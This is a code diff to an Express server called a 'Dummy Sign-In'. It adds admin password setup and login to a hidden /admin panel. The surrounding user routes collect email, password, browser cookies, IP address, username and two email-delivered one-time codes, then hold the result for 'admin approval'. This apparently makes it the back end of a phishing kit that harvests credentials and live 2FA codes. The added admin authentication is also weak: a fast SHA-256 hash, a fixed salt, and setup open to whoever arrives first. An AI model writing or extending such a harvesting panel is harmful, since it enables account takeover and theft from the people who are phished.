@@ -3,14 +3,73 @@ const express = require('express');
 const nodemailer = require('nodemailer');
 const path = require('path');
 const crypto = require('crypto');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// In-memory store for OTPs
+// ---------- Admin password storage ----------
+const ADMIN_EMAIL = (process.env.GMAIL_USER || 'blessedresult6@gmail.com').toLowerCase();
+const DATA_DIR = path.join(__dirname, 'data');
+const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');
+
+// Ensure data directory exists (works locally; on Vercel it may be ephemeral)
+try {
+  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+} catch (e) {}
+
+function hashPassword(password) {
+  return crypto.createHash('sha256').update(password + 'dummy-salt-2026').digest('hex');
+}
+
+function loadAdminConfig() {
+  // 1. Prefer environment variable if set
+  if (process.env.ADMIN_PASSWORD) {
+    return {
+      email: ADMIN_EMAIL,
+      passwordHash: hashPassword(process.env.ADMIN_PASSWORD),
+      source: 'env'
+    };
+  }
+
+  // 2. Try reading from file (local persistence)
+  try {
+    if (fs.existsSync(ADMIN_FILE)) {
+      const data = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
+      return { ...data, source: 'file' };
+    }
+  } catch (e) {}
+
+  // 3. Nothing set yet
+  return null;
+}
+
+function saveAdminConfig(password) {
+  const config = {
+    email: ADMIN_EMAIL,
+    passwordHash: hashPassword(password),
+    createdAt: new Date().toISOString()
+  };
+
+  try {
+    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+    fs.writeFileSync(ADMIN_FILE, JSON.stringify(config, null, 2));
+  } catch (e) {
+    // On Vercel the filesystem is read-only / ephemeral – we still keep it in memory
+    console.warn('Could not write admin config to disk (normal on Vercel):', e.message);
+  }
+
+  // Also keep in memory for the current process
+  global.__adminConfig = config;
+  return config;
+}
+
+// Load on startup
+let adminConfig = loadAdminConfig() || global.__adminConfig || null;
+
+// ---------- Sessions for dummy users ----------
 const sessions = new Map();
 
-// Clean old sessions every 30 minutes
 setInterval(() => {
   const now = Date.now();
   for (const [id, s] of sessions.entries()) {
@@ -22,12 +81,12 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Hidden admin panel – available at /admin on your Vercel URL
+// Hidden admin panel
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'views', 'admin.html'));
 });
 
-// Gmail SMTP transporter
+// Gmail SMTP
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
@@ -74,9 +133,73 @@ async function sendOTPToUser(toEmail, otp, step) {
   }
 }
 
-// ========== API ROUTES ==========
+// ========== ADMIN API ==========
 
-// Step 1: Email + Password
+// Check if admin password is already set
+app.get('/api/admin-status', (req, res) => {
+  // Refresh from memory / file / env
+  adminConfig = loadAdminConfig() || global.__adminConfig || null;
+
+  res.json({
+    email: ADMIN_EMAIL,
+    passwordSet: !!adminConfig
+  });
+});
+
+// First-time setup – set admin password
+app.post('/api/admin-setup', (req, res) => {
+  const { email, password } = req.body;
+
+  if (!email || !password) {
+    return res.json({ success: false, message: 'Email and password are required' });
+  }
+
+  if (email.toLowerCase() !== ADMIN_EMAIL) {
+    return res.json({ success: false, message: 'This email is not authorized as admin' });
+  }
+
+  if (password.length < 6) {
+    return res.json({ success: false, message: 'Password must be at least 6 characters' });
+  }
+
+  // Only allow setup if no password exists yet
+  adminConfig = loadAdminConfig() || global.__adminConfig || null;
+  if (adminConfig) {
+    return res.json({ success: false, message: 'Password is already set. Please log in instead.' });
+  }
+
+  adminConfig = saveAdminConfig(password);
+
+  res.json({ success: true, message: 'Admin password set successfully. You are now logged in.' });
+});
+
+// Normal admin login
+app.post('/api/admin-login', (req, res) => {
+  const { email, password } = req.body;
+
+  adminConfig = loadAdminConfig() || global.__adminConfig || null;
+
+  if (!adminConfig) {
+    return res.json({
+      success: false,
+      needsSetup: true,
+      message: 'No password set yet. Please create one first.'
+    });
+  }
+
+  if (email.toLowerCase() !== ADMIN_EMAIL) {
+    return res.json({ success: false, message: 'Wrong email or password' });
+  }
+
+  if (hashPassword(password) !== adminConfig.passwordHash) {
+    return res.json({ success: false, message: 'Wrong email or password' });
+  }
+
+  res.json({ success: true });
+});
+
+// ========== USER API ROUTES ==========
+
 app.post('/api/step1', async (req, res) => {
   const { email, password, cookies, ip } = req.body;
 
@@ -120,7 +243,6 @@ app.post('/api/step1', async (req, res) => {
   });
 });
 
-// Step 2: Username + Confirm Password
 app.post('/api/step2', async (req, res) => {
   const { sessionId, username, confirmPassword } = req.body;
   const session = sessions.get(sessionId);
@@ -164,7 +286,6 @@ app.post('/api/step2', async (req, res) => {
   res.json({ success: true, message: 'Username received and password confirmed' });
 });
 
-// Step 3: Verify OTP 1 and send OTP 2
 app.post('/api/step3', async (req, res) => {
   const { sessionId, otp1 } = req.body;
   const session = sessions.get(sessionId);
@@ -198,7 +319,6 @@ app.post('/api/step3', async (req, res) => {
   });
 });
 
-// Step 4: Verify OTP 2
 app.post('/api/step4', async (req, res) => {
   const { sessionId, otp2 } = req.body;
   const session = sessions.get(sessionId);
@@ -239,28 +359,17 @@ app.post('/api/step4', async (req, res) => {
   res.json({ success: true, message: 'All steps completed. Waiting for admin approval.' });
 });
 
-// Admin login API
-app.post('/api/admin-login', (req, res) => {
-  const { email, password } = req.body;
-  const ADMIN_EMAIL = process.env.GMAIL_USER || 'blessedresult6@gmail.com';
-  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
-
-  if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
-    return res.json({ success: true });
-  }
-  res.json({ success: false, message: 'Wrong email or password' });
-});
-
-// Export the Express app for Vercel
+// Export for Vercel
 module.exports = app;
 
-// Only start the server when running locally (not on Vercel)
+// Local start
 if (require.main === module) {
   app.listen(PORT, () => {
     console.log(`\nDummy Sign-In server running at http://localhost:${PORT}`);
     console.log(`User page  → http://localhost:${PORT}/`);
-    console.log(`Admin panel → http://localhost:${PORT}/admin   (hidden)`);
-    console.log(`Admin email: ${process.env.GMAIL_USER || '(not set)'}`);
+    console.log(`Admin panel → http://localhost:${PORT}/admin`);
+    console.log(`Admin email: ${ADMIN_EMAIL}`);
+    console.log(`Password set: ${!!adminConfig}`);
     if (!process.env.GMAIL_APP_PASSWORD) {
       console.warn('WARNING: GMAIL_APP_PASSWORD is not set in .env');
     }
